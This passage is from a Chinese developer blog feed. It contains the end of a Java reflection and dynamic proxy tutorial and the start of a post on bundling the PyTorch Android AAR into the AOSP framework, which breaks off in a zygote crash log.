title="调用静态方法"></a>调用静态方法</h3><p>如果获取到的Method表示一个静态方法，调用静态方法时，由于无需指定实例对象，所以invoke方法传入的第一个参数永远为null。我们以Integer.parseInt(String)为例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 获取Integer.parseInt(String)方法，参数为String:</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> Integer.class.getMethod(<span class="string">&quot;parseInt&quot;</span>, String.class);</span><br><span class="line">        <span class="comment">// 调用该静态方法并获取结果:</span></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">n</span> <span class="operator">=</span> (Integer) m.invoke(<span class="literal">null</span>, <span class="string">&quot;12345&quot;</span>);</span><br><span class="line">        <span class="comment">// 打印调用结果:</span></span><br><span class="line">        System.out.println(n);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="调用非public方法"><a href="#调用非public方法" class="headerlink" title="调用非public方法"></a>调用非public方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> p.getClass().getDeclaredMethod(<span class="string">&quot;setName&quot;</span>, String.class);</span><br><span class="line">        m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        m.invoke(p, <span class="string">&quot;Bob&quot;</span>);</span><br><span class="line">        System.out.println(p.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>setAccessible(true)可能会失败。如果JVM运行期存在SecurityManager，那么它会根据规则进行检查，有可能阻止setAccessible(true)。例如，某个SecurityManager可能不允许对java和javax开头的package的类调用setAccessible(true)，这样可以保证JVM核心库的安全。</p><h3 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h3><p>一个Person类定义了hello()方法，并且它的子类Student也覆写了hello()方法，那么，从Person.class获取的Method，作用于Student实例时，调用的方法到底是哪个？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 获取Person的hello方法:</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">h</span> <span class="operator">=</span> Person.class.getMethod(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        <span class="comment">// 对Student实例调用hello方法:</span></span><br><span class="line">        h.invoke(<span class="keyword">new</span> <span class="title class_">Student</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Person:hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student:hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行上述代码，发现打印出的是Student:hello，因此，使用反射调用方法时，仍然遵循多态原则：即总是调用实际类型的覆写方法（如果存在）。</p><h2 id="调用构造方法"><a href="#调用构造方法" class="headerlink" title="调用构造方法"></a>调用构造方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> Person.class.newInstance();</span><br></pre></td></tr></table></figure><p>调用Class.newInstance()的局限是，它只能调用该类的public无参数构造方法。如果构造方法带有参数，或者不是public，就无法直接通过Class.newInstance()来调用。为了调用任意的构造方法，Java的反射API提供了Constructor对象，它包含一个构造方法的所有信息，可以创建一个实例。Constructor对象和Method非常类似，不同之处仅在于它是一个构造方法，并且，调用结果总是返回实例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 获取构造方法Integer(int):</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">cons1</span> <span class="operator">=</span> Integer.class.getConstructor(<span class="type">int</span>.class);</span><br><span class="line">        <span class="comment">// 调用构造方法:</span></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">n1</span> <span class="operator">=</span> (Integer) cons1.newInstance(<span class="number">123</span>);</span><br><span class="line">        System.out.println(n1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取构造方法Integer(String)</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">cons2</span> <span class="operator">=</span> Integer.class.getConstructor(String.class);</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">n2</span> <span class="operator">=</span> (Integer) cons2.newInstance(<span class="string">&quot;456&quot;</span>);</span><br><span class="line">        System.out.println(n2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过Class实例获取Constructor的方法如下：</p><ul><li>getConstructor(Class…)：获取某个public的Constructor；</li><li>getDeclaredConstructor(Class…)：获取某个Constructor；</li><li>getConstructors()：获取所有public的Constructor；</li><li>getDeclaredConstructors()：获取所有Constructor。</li></ul><p>注意Constructor总是当前类定义的构造方法，和父类无关，因此不存在多态的问题。<br>调用非public的Constructor时，必须首先通过setAccessible(true)设置允许访问。setAccessible(true)可能会失败。</p><h2 id="获取继承关系"><a href="#获取继承关系" class="headerlink" title="获取继承关系"></a>获取继承关系</h2><p>获取Class的三种方式:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> String.class; <span class="comment">// 获取到String的Class</span></span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> s.getClass(); <span class="comment">// s是String，因此获取到String的Class</span></span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">s</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.String&quot;</span>);</span><br></pre></td></tr></table></figure><p>上述三种方式获取的Class实例都是同一个实例，因为JVM对每个加载的Class只创建一个Class实例来表示它的类型。</p><h3 id="获取父类的Class"><a href="#获取父类的Class" class="headerlink" title="获取父类的Class"></a>获取父类的Class</h3><p>有了Class实例，我们还可以获取它的父类的Class：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">i</span> <span class="operator">=</span> Integer.class;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">n</span> <span class="operator">=</span> i.getSuperclass();</span><br><span class="line">        System.out.println(n);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">o</span> <span class="operator">=</span> n.getSuperclass();</span><br><span class="line">        System.out.println(o);</span><br><span class="line">        System.out.println(o.getSuperclass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Integer的父类类型是Number，Number的父类是Object，Object的父类是null。除Object外，其他任何非interface的Class都必定存在一个父类类型。</p><h3 id="获取interface"><a href="#获取interface" class="headerlink" title="获取interface"></a>获取interface</h3><p>由于一个类可能实现一个或多个接口，通过Class我们就可以查询到实现的接口类型。例如，查询Integer实现的接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">s</span> <span class="operator">=</span> Integer.class;</span><br><span class="line">        Class[] is = s.getInterfaces();</span><br><span class="line">        <span class="keyword">for</span> (Class i : is) &#123;</span><br><span class="line">            System.out.println(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行上述代码可知，Integer实现的接口有：<br>java.lang.Comparable<br>java.lang.constant.Constable<br>java.lang.constant.ConstantDesc<br>getInterfaces()只返回当前类直接实现的接口类型，并不包括其父类实现的接口类型：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">s</span> <span class="operator">=</span> Integer.class.getSuperclass();</span><br><span class="line">        Class[] is = s.getInterfaces();</span><br><span class="line">        <span class="keyword">for</span> (Class i : is) &#123;</span><br><span class="line">            System.out.println(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Integer的父类是Number，Number实现的接口是java.io.Serializable。对所有interface的Class调用getSuperclass()返回的是null，获取接口的父接口要用getInterfaces()：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(java.io.DataInputStream.class.getSuperclass()); <span class="comment">// java.io.FilterInputStream，因为DataInputStream继承自FilterInputStream</span></span><br><span class="line">System.out.println(java.io.Closeable.class.getSuperclass()); <span class="comment">// null，对接口调用getSuperclass()总是返回null，获取接口的父接口要用getInterfaces()</span></span><br></pre></td></tr></table></figure><p>如果一个类没有实现任何interface，那么getInterfaces()返回空数组。</p><h3 id="继承关系"><a href="#继承关系" class="headerlink" title="继承关系"></a>继承关系</h3><p>当我们判断一个实例是否是某个类型时，正常情况下，使用instanceof操作符：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">n</span> <span class="operator">=</span> Integer.valueOf(<span class="number">123</span>);</span><br><span class="line"><span class="type">boolean</span> <span class="variable">isDouble</span> <span class="operator">=</span> n <span class="keyword">instanceof</span> Double; <span class="comment">// false</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">isInteger</span> <span class="operator">=</span> n <span class="keyword">instanceof</span> Integer; <span class="comment">// true</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">isNumber</span> <span class="operator">=</span> n <span class="keyword">instanceof</span> Number; <span class="comment">// true</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">isSerializable</span> <span class="operator">=</span> n <span class="keyword">instanceof</span> java.io.Serializable; <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>如果是两个Class实例，要判断一个向上转型是否成立，可以调用isAssignableFrom()：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Integer i = ?</span></span><br><span class="line">Integer.class.isAssignableFrom(Integer.class); <span class="comment">// true，因为Integer可以赋值给Integer</span></span><br><span class="line"><span class="comment">// Number n = ?</span></span><br><span class="line">Number.class.isAssignableFrom(Integer.class); <span class="comment">// true，因为Integer可以赋值给Number</span></span><br><span class="line"><span class="comment">// Object o = ?</span></span><br><span class="line">Object.class.isAssignableFrom(Integer.class); <span class="comment">// true，因为Integer可以赋值给Object</span></span><br><span class="line"><span class="comment">// Integer i = ?</span></span><br><span class="line">Integer.class.isAssignableFrom(Number.class); <span class="comment">// false，因为Number不能赋值给Integer</span></span><br></pre></td></tr></table></figure><h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>有没有可能不编写实现类，直接在运行期创建某个interface的实例呢？这是可能的，因为Java标准库提供了一种动态代理（Dynamic Proxy）的机制：可以在运行期动态创建某个interface的实例。<br>所谓动态代理，是和静态相对应的。我们来看静态代码怎么写：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">morning</span><span class="params">(String name)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> <span class="keyword">implements</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">morning</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Good morning, &quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">Hello</span> <span class="variable">hello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HelloWorld</span>();</span><br><span class="line">hello.morning(<span class="string">&quot;Bob&quot;</span>);</span><br></pre></td></tr></table></figure><p>动态代码，我们仍然先定义了接口Hello，但是我们并不去编写实现类，而是直接通过JDK提供的一个Proxy.newProxyInstance()创建了一个Hello接口对象。这种没有实现类但是在运行期动态创建了一个接口对象的方式，我们称为动态代码。JDK提供的动态创建接口对象的方式，就叫动态代理。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvocationHandler</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                System.out.println(method);</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;morning&quot;</span>)) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;Good morning, &quot;</span> + args[<span class="number">0</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Hello</span> <span class="variable">hello</span> <span class="operator">=</span> (Hello) Proxy.newProxyInstance(</span><br><span class="line">            Hello.class.getClassLoader(), <span class="comment">// 传入ClassLoader</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Hello.class &#125;, <span class="comment">// 传入要实现的接口</span></span><br><span class="line">            handler); <span class="comment">// 传入处理调用方法的InvocationHandler</span></span><br><span class="line">        hello.morning(<span class="string">&quot;Bob&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">morning</span><span class="params">(String name)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在运行期动态创建一个interface实例的方法如下：</p><ol><li>定义一个InvocationHandler实例，它负责实现接口的方法调用；</li><li>通过Proxy.newProxyInstance()创建interface实例，它需要3个参数：<ol><li>使用的ClassLoader，通常就是接口类的ClassLoader；</li><li>需要实现的接口数组，至少需要传入一个接口进去；</li><li>用来处理接口方法调用的InvocationHandler实例。</li></ol></li><li>将返回的Object强制转型为接口。</li></ol><p>动态代理实际上是JVM在运行期动态创建class字节码并加载的过程，它并没有什么黑魔法，把上面的动态代理改写为静态实现类大概长这样：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloDynamicProxy</span> <span class="keyword">implements</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    InvocationHandler handler;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HelloDynamicProxy</span><span class="params">(InvocationHandler handler)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.handler = handler;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">morning</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        handler.invoke(</span><br><span class="line">           <span class="built_in">this</span>,</span><br><span class="line">           Hello.class.getMethod(<span class="string">&quot;morning&quot;</span>, String.class),</span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; name &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>动态代理意味着什么呢？实际上，Java 中的“动态”也就意味着使用了反射，因此动态代理其实是基于反射机制的一种代理模式。</p><p>有关动态代理,还存在这Javassist和ASM <a href="https://www.cnblogs.com/fanguangdexiaoyuer/p/12522765.html">https://www.cnblogs.com/fanguangdexiaoyuer/p/12522765.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Android系统开发】把Pytorch集成到android系统当中</title>
      <link href="/2024/12/16/code/pytorchAndroid/"/>
      <url>/2024/12/16/code/pytorchAndroid/</url>
      
        <content type="html"><![CDATA[<h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>最近都在搞论文，需要在android系统上跑模型，所以需要把pytorch集成到android系统当中。简单记录下</p><h2 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h2><p>我找了很多方案，官网说可以自己编译pytorch，但是环境配置很复杂【<a href="https://zhuanlan.zhihu.com/p/650169531%E3%80%91%EF%BC%8C%E5%8F%91%E7%8E%B0%E5%85%B6%E5%AE%9E%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BDaar%E6%96%87%E4%BB%B6">https://zhuanlan.zhihu.com/p/650169531】，发现其实可以直接下载aar文件</a><br><a href="https://repo1.maven.org/maven2/org/pytorch/pytorch_android/1.10.0/pytorch_android-1.10.0.aar">https://repo1.maven.org/maven2/org/pytorch/pytorch_android/1.10.0/pytorch_android-1.10.0.aar</a></p><p>刚开始尝试从aar文件当中提取so文件以及头文件，集成进Adnroid里面<br>参考了这些博客：<a href="https://blog.csdn.net/zuguorui/article/details/96464821">https://blog.csdn.net/zuguorui/article/details/96464821</a> 发现也是不行，具体原因忘记了</p><p>接下来直接从官网下载的pytorchaar文件，分析下来这个方案可行的原因主要是我是在framwork层，本身是可以集成java环境的，直接在java层调用pytorch的api</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>参考了这篇博客，基本步骤是一样的：<a href="https://blog.csdn.net/DKBDKBDKB/article/details/104153094%EF%BC%8C%E4%BD%86%E8%BF%99%E4%B8%AA%E5%8D%9A%E5%AE%A2%E9%87%8C%E9%9D%A2%E7%BC%BA%E4%BA%86%E7%82%B9%E4%B8%9C%E8%A5%BF">https://blog.csdn.net/DKBDKBDKB/article/details/104153094，但这个博客里面缺了点东西</a></p><ol><li>在framworks&#x2F;base下新建一个目录，例如：pytorch，将aar文件放在这个目录下，并新建一个文件 Adnroid.bp 修改其中内容如下<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">android_library_import &#123;</span><br><span class="line">    name: &quot;services.pytorch&quot;,</span><br><span class="line">    aars: [&quot;pytorch_android-1.10.0.aar&quot;],</span><br><span class="line">    sdk_version: &quot;current&quot;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>之后在base目录下的Android.bp文件里的java_library当中的static_libs添加一行<code>&quot;services.pytorch&quot;,</code>，这样就完成一大半了</li></ol><p>之后我编译却发现不行。。。 尝试了很多次</p><p>奥对了 我还在代码当中引用了pytorch</p><p>之后使用在编译系统时使用make clean<br>报错不被允许，参考下面的内容修改 build&#x2F;soong&#x2F;scripts&#x2F;check_boot_jars&#x2F;package_allowed_list.txt<br><a href="https://stackoverflow.com/questions/77813438/add-an-external-aar-library-to-aosp-for-internal-use-from-java-in-frameworks-bas">https://stackoverflow.com/questions/77813438/add-an-external-aar-library-to-aosp-for-internal-use-from-java-in-frameworks-bas</a></p><p>添加：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">org\.torch</span><br><span class="line">org\.torch\..*</span><br></pre></td></tr></table></figure><p>解决报错</p><h2 id="使用pytorch"><a href="#使用pytorch" class="headerlink" title="使用pytorch"></a>使用pytorch</h2><p>我写了代码使用了上面的pytorch 代码首先我在应用层app里面运行了没有问题才用的<br>到系统里封装了类 又出现了报错 这次是直接进入循环开机 能够开开说明内核什么的没问题<br>就是我在framwork加的代码出问题了</p><p>刚开始发现adb并不能用,但是我尝试了adb devices<br>可以识别到手机 但是未授权 找了下资料 可以在系统中设置自动开启adb调试<br><a href="https://bbs.kanxue.com/thread-281293.htm">https://bbs.kanxue.com/thread-281293.htm</a><br>解决问题,观察到如下报错,果然是代码问题,太不熟悉了,重构下代码编译运行下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Exception dispatching input event.</span><br><span class="line">2024-12-17 17:37:22.776  7496-7496  Zygote                  system_process                       E  System zygote died with fatal exception</span><br><span class="line">                                                                                                    java.lang.NullPointerException: Attempt to invoke virtual method &#x27;float[][] android.hardware.SystemSensorManager$TensorProcessingTool.processSensorData(float[][])&#x27; on a null object reference</span><br><span class="line">                                                                                                    at android.hardware.SystemSensorManager$SensorEventQueue.dispatchSensorEvent(SystemSensorManager.java:1104)</span><br><span class="line">                                                                                                    at android.os.MessageQueue.nativePollOnce(Native Method)</span><br><span class="line">                                                                                                    at android.os.MessageQueue.next(MessageQueue.java:335)</span><br><span class="line">                                                                                                    at android.os.Looper.loopOnce(Looper.java:161)</span><br><span class="line">                                                                                                    at android.os.Looper.loop(Looper.java:288)</span><br><span class="line">                                                                                                    at com.android.server.SystemServer.run(SystemServer.java:903)</span><br><span class="line">                                                                                                    at com.android.server.SystemServer.main(SystemServer.java:610)</span><br><span class="line">                                                                                                    at java.lang.reflect.Method.invoke(Native Method)</span><br><span class="line">                                                                                                    at 